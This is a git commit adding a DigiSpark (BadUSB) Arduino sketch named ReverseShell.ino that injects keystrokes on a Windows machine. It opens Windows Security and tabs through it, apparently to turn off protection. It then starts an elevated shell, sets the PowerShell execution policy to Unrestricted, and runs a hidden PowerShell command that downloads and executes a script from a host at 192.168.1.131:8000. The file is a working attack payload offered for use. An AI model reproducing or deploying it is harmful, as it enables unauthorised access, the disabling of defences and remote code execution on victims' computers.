ef8a386fe31423722e10b7efe9bb721673e5838b
Jordi Forés Garcia <73621025+xthalach@users.noreply.github.com>
2022-09-28 19:52:03 +0200

    Add files via upload

---
+++ Payload/ReverseShell.ino
@@ -0,0 +1,63 @@
+//This DigiSpark scripts downloads and executes a powershell script in hidden mode.
+#define kbd_es_es
+#include "DigiKeyboard.h"
+void setup() {
+}
+
+void loop() {
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print("Antivirus");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print("\t");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print("\t");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print("\t");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print("\t");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_SPACE);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print("\t");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_SPACE);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print("\t");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_SPACE);
+  DigiKeyboard.delay(1000);
+  //DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
+  //DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print("powershell Start-Process cmd -Verb runAs");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print("powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  //DigiKeyboard.print("powershell \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.131:8000/payload.ps1');\"");
+  DigiKeyboard.print("powershell -WindowStyle hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.131:8000/payload.ps1')\" ");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  for (;;) {
+    /*empty*/
+  }
+
+}
